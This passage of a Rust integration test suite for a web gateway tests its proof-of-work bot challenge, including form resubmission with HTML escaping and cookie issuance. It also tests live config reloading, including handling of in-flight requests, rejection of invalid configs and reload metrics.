action = "challenge"
"#,
    )
    .await;
    let xff = ("x-forwarded-for", "203.0.113.77");
    let html = ("accept", "text/html");
    let form = ("content-type", "application/x-www-form-urlencoded");
    let body = "user=anna&pass=p%40ss&note=Tom+%26+Jerry+%3C3";

    let page = send(
        gw.addr,
        "POST",
        "/signin?ok=1",
        &[xff, html, form, ("sec-fetch-site", "same-origin")],
        body,
    )
    .await;
    assert_eq!(page.status, StatusCode::FORBIDDEN);
    assert!(page.body.contains("id=\"pg-resubmit\""), "{}", page.body);
    assert!(page.body.contains("name=\"user\" value=\"anna\""));
    assert!(
        page.body
            .contains("name=\"note\" value=\"Tom &amp; Jerry &lt;3\"")
    );

    // solve it the way the page does, then fetch the cookie with j=1
    let vars = &page.body[page.body.find("var N=").unwrap()..];
    let nonce = between(vars, "var N=\"", "\"");
    let e = between(vars, ",E=", ",");
    let d: u32 = between(vars, ",D=", ",").parse().unwrap();
    let s = between(vars, ",S=\"", "\"");
    let counter = (0u64..)
        .find(|c| {
            let h = Sha256::digest(format!("{nonce}:{c}").as_bytes());
            pattern_guard_gateway::challenge::leading_zero_bits(&h) >= d
        })
        .unwrap();
    let verify = format!("/.pattern-guard/verify?n={nonce}&e={e}&d={d}&s={s}&c={counter}&j=1");
    let v = send(gw.addr, "GET", &verify, &[xff], "").await;
    assert_eq!(v.status, StatusCode::NO_CONTENT);
    assert!(v.headers.get("location").is_none());
    let cookie = v
        .headers
        .get("set-cookie")
        .unwrap()
        .to_str()
        .unwrap()
        .split(';')
        .next()
        .unwrap()
        .to_string();

    // the re-sent form now reaches the application
    let resent = send(
        gw.addr,
        "POST",
        "/signin?ok=1",
        &[xff, html, form, ("cookie", &cookie)],
        body,
    )
    .await;
    assert_eq!(resent.status, StatusCode::OK, "{}", resent.body);

    // a cross-site POST gets the page but nothing to re-send
    let cross = send(
        gw.addr,
        "POST",
        "/signin",
        &[
            ("x-forwarded-for", "203.0.113.78"),
            html,
            form,
            ("sec-fetch-site", "cross-site"),
        ],
        body,
    )
    .await;
    assert_eq!(cross.status, StatusCode::FORBIDDEN);
    assert!(cross.body.contains("not a bot") && !cross.body.contains("id=\"pg-resubmit\""));

    // API clients keep the JSON answer
    let api = send(
        gw.addr,
        "POST",
        "/signin",
        &[("x-forwarded-for", "203.0.113.79"), form],
        body,
    )
    .await;
    assert!(api.body.contains("challenge_required"));
}

/// Reads one response from a raw connection; returns the status.
async fn raw_status(s: &mut tokio::net::TcpStream) -> u16 {
    use tokio::io::AsyncReadExt;
    let mut buf = Vec::new();
    let mut tmp = [0u8; 4096];
    let head_end = loop {
        let n = s.read(&mut tmp).await.unwrap();
        assert!(n > 0, "connection closed before a response");
        buf.extend_from_slice(&tmp[..n]);
        if let Some(i) = buf.windows(4).position(|w| w == b"\r\n\r\n") {
            break i + 4;
        }
    };
    let head = String::from_utf8_lossy(&buf[..head_end]).to_ascii_lowercase();
    let len: usize = head
        .lines()
        .find_map(|l| l.strip_prefix("content-length:"))
        .map_or(0, |v| v.trim().parse().unwrap());
    while buf.len() < head_end + len {
        let n = s.read(&mut tmp).await.unwrap();
        assert!(n > 0);
        buf.extend_from_slice(&tmp[..n]);
    }
    head[9..12].parse().unwrap()
}

#[tokio::test]
async fn config_reload_applies_to_the_next_request_and_spares_those_in_flight() {
    use tokio::io::AsyncWriteExt;
    let gw = start_gateway("").await;
    assert_eq!(
        send(gw.addr, "GET", "/reports/1", &[], "").await.status,
        StatusCode::OK
    );
    // a request in flight: its head and half of its body have arrived
    let mut s = tokio::net::TcpStream::connect(gw.addr).await.unwrap();
    s.write_all(b"POST /reports/upload HTTP/1.1\r\nhost: x\r\ncontent-length: 8\r\n\r\nhalf")
        .await
        .unwrap();
    let m = gw.state.runtime.metrics.clone();
    for _ in 0..200 {
        if m.buffered_body_bytes.load(Ordering::SeqCst) == 4 {
            break;
        }
        tokio::time::sleep(Duration::from_millis(10)).await;
    }
    assert_eq!(m.buffered_body_bytes.load(Ordering::SeqCst), 4);

    // reload with a rule that blocks it
    let rules = GatewayConfig::from_toml_str(
        "upstream = \"http://127.0.0.1:1\"\n[[rules]]\nname = \"no reports\"\npath = \"/reports\"\naction = \"block\"\n",
    )
    .unwrap()
    .rules;
    let mut cfg = gw.state.compiled().cfg.clone();
    cfg.rules = rules;
    let done = pattern_guard_gateway::reload(&gw.state, cfg).unwrap();
    assert!(done.kept.is_empty(), "{:?}", done.kept);

    // the next request sees it …
    let r = send(gw.addr, "GET", "/reports/2", &[], "").await;
    assert_eq!(r.status, StatusCode::FORBIDDEN);
    // … the one in flight finishes with the config it started with …
    s.write_all(b"rest").await.unwrap();
    assert_eq!(raw_status(&mut s).await, 200);
    // … and its connection stays open; its next request gets the new config
    s.write_all(b"GET /reports/3 HTTP/1.1\r\nhost: x\r\n\r\n")
        .await
        .unwrap();
    assert_eq!(raw_status(&mut s).await, 403);

    // an invalid config is refused and the running one stays
    let mut bad = gw.state.compiled().cfg.clone();
    bad.rate_limits = GatewayConfig::from_toml_str(
        "upstream = \"http://127.0.0.1:1\"\n[[rate_limits]]\nname = \"x\"\nkey = \"nope\"\nrequests = 1\nper_secs = 1\n",
    )
    .unwrap()
    .rate_limits;
    let e = pattern_guard_gateway::reload(&gw.state, bad).unwrap_err();
    assert!(e.contains("rate limit \"x\""), "{e}");
    assert_eq!(
        send(gw.addr, "GET", "/reports/4", &[], "").await.status,
        StatusCode::FORBIDDEN
    );
    let metrics = send(gw.admin, "GET", "/metrics", &[], "").await.body;
    assert!(metrics.contains("pattern_guard_config_reloads_total{result=\"ok\"} 1"));
    assert!(metrics.contains("pattern_guard_config_reloads_total{result=\"error\"} 1"));
}
